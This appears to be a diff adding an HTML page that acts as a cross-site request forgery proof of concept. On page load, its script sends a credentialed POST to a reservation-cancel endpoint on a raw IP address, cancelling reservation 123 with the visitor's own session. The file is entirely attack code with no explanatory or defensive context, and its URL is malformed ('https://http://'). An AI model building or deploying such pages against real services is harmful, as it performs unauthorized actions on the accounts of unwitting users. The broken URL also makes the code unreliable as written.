@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+  <body>
+    <script>
+      // Example: cancel reservationId=123
+      fetch('https://http://20.107.244.27:54321/api/reservations/cancel', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ reservationId: 123 })
+      });
+    </script>
+  </body>
+</html>
